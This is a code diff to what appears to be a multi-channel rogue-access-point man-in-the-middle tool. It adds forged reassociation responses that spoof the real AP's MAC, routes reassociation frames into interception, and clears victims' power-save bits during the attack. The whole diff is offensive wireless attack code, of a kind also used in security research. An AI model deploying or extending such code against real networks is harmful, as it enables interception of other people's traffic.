@@ -33,32 +33,42 @@ bool McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) const{
 }
 
 bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, Dot11 &dot11) const{
+    const Dot11ManagementFrame::rates_type rates = {
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(82),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(84),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(139),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(150),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(36),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(48),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(72),
+        static_cast<Dot11ManagementFrame::rates_type::value_type>(96),
+    };
+
     if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()){
         Dot11AssocResponse resp;
-        resp.addr1(addr2);  // target sta
-        resp.addr2(ap_mac); // rogue AP
+        resp.addr1(addr2);
+        resp.addr2(ap_mac);
         resp.addr3(ap_mac);
-        resp.status_code(0); //success
+        resp.status_code(0);
         resp.capabilities() = assoc->capabilities();
         resp.aid(1);
-
-        // Supported Rates IE
-        const Dot11ManagementFrame::rates_type rates = {
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(82),  // 1 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(84),  // 2 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(139), // 5.5 Mbps (basic)
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(150), // 11 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(36),  // 18 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(48),  // 24 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(72),  // 36 Mbps
-            static_cast<Dot11ManagementFrame::rates_type::value_type>(96),  // 48 Mbps
-        };
         resp.supported_rates(rates);
         send_to_rogue(resp);
-        display_traffic(dot11, "Rogue channel", " -- Replied");
-        send_to_real(pdu);
-        return true;
+    }else if(const auto *reassoc  = dot11.find_pdu<Dot11ReAssocRequest>()){
+        Dot11ReAssocResponse resp;  // correct subtype
+        resp.addr1(addr2);
+        resp.addr2(ap_mac);
+        resp.addr3(ap_mac);
+        resp.status_code(0);
+        resp.capabilities() = reassoc->capabilities();
+        resp.aid(1);
+        resp.supported_rates(rates);
+        send_to_rogue(resp);
+    }else{
+        return false;
     }
+    display_traffic(dot11, "Rogue channel", " -- Replied");
+    //send_to_real(pdu);
     return false;
 }
 
@@ -98,10 +108,10 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
         return;
     }
 
-    //FIXME
-    if(handle_open_auth(addr2, *dot11)) return;
-    if(handle_assoc_request(addr2, *pdu, *dot11)) return;
     if(handle_probe(addr2, pdu.get(), *dot11)) return;
+    if(handle_open_auth(addr2, *dot11)) return;
+    handle_assoc_request(addr2, *pdu, *dot11);
+
     //TODO if(handle_action_rogue(addr2, *pdu, *dot11)) return;
 
     // EAPOL od AP → forward na rogue channel
@@ -131,7 +141,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
             client = clients.at(addr2).get();
             will_forward = client->should_forward(*pdu);
             if(dot11->find_pdu<Dot11Authentication>() ||
-                dot11->find_pdu<Dot11AssocRequest>() ||
+                dot11->find_pdu<Dot11AssocRequest>() || dot11->find_pdu<Dot11ReAssocRequest>() ||
                 client->state <= ClientState::Connecting){
                 print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
                 client->mark_got_mitm();
@@ -141,7 +151,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
         } else if(
             // auth/assoc what rogue AP cant generate
             dot11->find_pdu<Dot11Authentication>() ||
-            dot11->find_pdu<Dot11AssocRequest>() ||
+            dot11->find_pdu<Dot11AssocRequest>() || dot11->find_pdu<Dot11ReAssocRequest>() ||
             dot11->type() == Dot11::DATA){
 
             print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
@@ -160,7 +170,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
             if( dot11->power_mgmt() && clients.contains(addr2) &&
                 clients.at(addr2)->state < ClientState::Attack_Done){
                 log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2);
-                //dot11->power_mgmt(0);
+                dot11->power_mgmt(0);
             }
             send_to_real(*pdu);
         }
